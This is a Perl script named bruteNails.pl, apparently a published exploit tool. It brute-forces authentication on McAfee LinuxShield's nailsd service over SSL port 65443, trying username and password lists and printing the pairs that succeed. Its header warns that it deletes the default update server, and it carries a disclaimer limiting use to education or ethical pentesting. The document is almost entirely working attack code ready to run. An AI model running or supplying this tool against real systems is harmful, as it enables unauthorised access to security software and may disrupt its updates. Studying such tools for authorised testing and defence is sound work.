#!/usr/bin/perl

##
#  Title:     Brute force for McAfee LinuxShield nailsd 
#  Name:      bruteNails.pl
#  Author:    Nikolas Sotiriu (lofi) <lofi[at]sotiriu.de>
#  WARNING:   This Exploit deletes the default Update Server
#
# Use it only for education or ethical pentesting! The author accepts 
# no liability for damage caused by this tool.
##

use IO::Socket::SSL;
use strict;
use Getopt::Long;
Getopt::Long::config qw(no_ignore_case);

$|=1;

my $total = 0;
my ($list,$host,$user,$passwd,$debug,$tout,$ufile,$pfile,$ip,$port);
my $stime = time();

my $opts = GetOptions( 'host:s' => \$host, 'user:s' => \$user, 
                       'passwd:s' => \$passwd, 'debug:i' => \$debug, 
                       'tout:i' => \$tout, 'Ufile:s' => \$ufile,
                       'Pfile:s' => \$pfile);

my $ip = $host;

# Default options
my $port = "65443" if ! $port;
my $tout = "10" if ! $tout;
my $post = "\x0d\x0a";

&help unless $opts;
if (!$host) { &help }
if (!$user && !$ufile) { &help }
if (!$passwd && !$pfile) { &help }
if ($ufile && $user)  { &help }
if ($pfile && $passwd) { &help }
#if ($ufile || $user) { &help }
#if (($pfile || $passwd) && $list ) { &help }

banner();

print "#" x 80;
print "\nTrying: $ip:$port ($tout secs)\n";
print "Running ....\n";

if ($ufile) {
	open U, "$ufile" or die "Can't open user file $ufile : $!";
	while (<U>) {
		chomp($_);
		$user = $_;

		if ($pfile) {
			open P, "$pfile" or die "Can't open passwd file: $pfile : $!";
			while (<P>) {
				chomp($_);
				$passwd = $_;
				my $ec = &connect($ip,$port,$user,$passwd);
				if ($ec == 0) { 
					print "[+] GOT ONE: $user/$passwd - $ip:$port\n";
					$total++;
				} else {
					print "[-] FAILED: $user/$passwd - $ip:$port\n" if $debug;
				}
			}
			close (P);
		} else {
			my $ec = &connect($ip,$port,$user,$passwd);
			if ($ec == 0) { 
				print "[+] GOT ONE: $user/$passwd - $ip:$port\n";
				$total++;
			} else {
				print "[-] FAILED: $user/$passwd - $ip:$port\n" if $debug;
			}
		}
	}
	close (U);
} else {

if ($pfile) {
	open P, "$pfile" or die "Can't open passwd file: $pfile : $!";
	while (<P>) {
		chomp($_);
		$passwd = $_;
		my $ec = &connect($ip,$port,$user,$passwd);
		if ($ec == 0) { 
			print "[+] GOT ONE: $user/$passwd - $ip:$port\n";
			$total++;
		} else {
			print "[-] FAILED: $user/$passwd - $ip:$port\n" if $debug;
		}
	}
	close (P);
} else {
	my $ec = &connect($ip,$port,$user,$passwd);
	if ($ec == 0) { 
		print "[+] GOT ONE: $user/$passwd - $ip:$port\n";
		$total++;
	} else {
		print "[-] FAILED: $user/$passwd - $ip:$port\n";
	}
}
}

my $ftime = time();
my $time = $ftime - $stime;
print "Finished: ($total) users found. ($time secs)\n";

sub connect {
my $ec = 1;
my ($ip,$port,$user,$passwd)=@_;
my ($socket) = IO::Socket::SSL->new(
               PeerAddr => $ip,
               PeerPort => $port,
               Proto => 'tcp') || die "Can't connect to: $ip:$port - $!\n";

$socket->autoflush(1);

 my $ack=<$socket>;
 print $ack if $debug;

 print $socket "auth ".$user." ".$passwd.$post;

 my $ack=<$socket>;
 print $ack if $debug;
 if ($ack=~m/successful authentication/){
	$ec=0;
 } 
 close($socket);
 return $ec;
}

sub help {
  print "bruteNails - McAfee nailsd bruteforcer by <nsotiriu\@sotiriu.de>\n";
  print "usage: $0 -h <host> <[-u <user> | -U <file>] [-p <passwd> | -P <file>] [-t <n>] [-d <1|0>]\n";
  print "options:\n";
  print "  -h, --host <host>\t\thost \n";
  print "  -u, --user <user>\t\tusername\n";
  print "  -U, --Ufile <file>\t\tfile with users list\n";
  print "  -p, --passwd <passwd>\t\tpassword\n";
  print "  -P, --Pfile <file>\t\tfile with passwords list\n";
  print "  -t, --tout <n>\t\tconnection timeout (default: 10)\n";
  print "  -d, --debug <1|0>\t\tenable debug (default: 0)\n";
  exit 0
}

sub banner {
        print STDERR << "EOF";
--------------------------------------------------------------------------------
         bruteNails - McAfee nailsd bruteforcer by <nsotiriu\@sotiriu.de>
--------------------------------------------------------------------------------

                                   111 1111111
                            11100 101 00110111001111
                        11101 11 10 111 101 1001111111
                    1101  11 00 10 11  11 111 1111111101
                 10111 1 10 11 10  0 10  1 1 1  1111111011
              1111  1 1 10  0  01 01 01 1 1 111     1111011101
            1000   0 11 10 10  0 10 11 111 11111 11 1111 111100
          1111111111 01 10 10 11 01 0  11 11111111111 1 1111  11
         10111110 0  01 00 11 1110 11 10 11111111111 11 11111  11   111
        101111111 0 10  01 11 1 11 0 10 11 1111111111111111 1111110000111
        011111 0110 10 10  0 11 1 11 01 01 111111111111111 1 11110011001
       1011111 0110 10 11 1110 11 1 10 11111111111111111111  1 100  001
       1011111 0 10 10 01 1  0 1 11 1 111111111111111111111111 001101
        011111 0  0  0 11 0 1111 0 11 01111111111111111111111111  01
       1111111 01 01 111  1 1111 1 11 1111111111111111111111 1101 1111
      111 1111 10  0 111110 0111 0 1  0111111111111111111111 11111 1111
     111 11111  1  11 1 1 1    111 11 11111111111111111111111110    1001
    111 1011111   1 11111111110111111111111111111111111111111 01 10111001
   11 1100    10110110    10001        11101111111111111111  10 111 11100
  111  00      1011101      00101       0  11111111111111111001 11  111101
  11  00        00 101      1000011     1011   1111   1111111000 1111111 0
  11 00          0   1011      100001    101000 1 1001         00001111  01
  01101          11111 1011               01100    0101          110  11 10
  10111                   1                0  01    0000011         10    10
   10011                                    11100       1111         101   11
      1110 01                                 101011                   1001100
         1111000011                            1  111
                11000001111
                           1

EOF
}

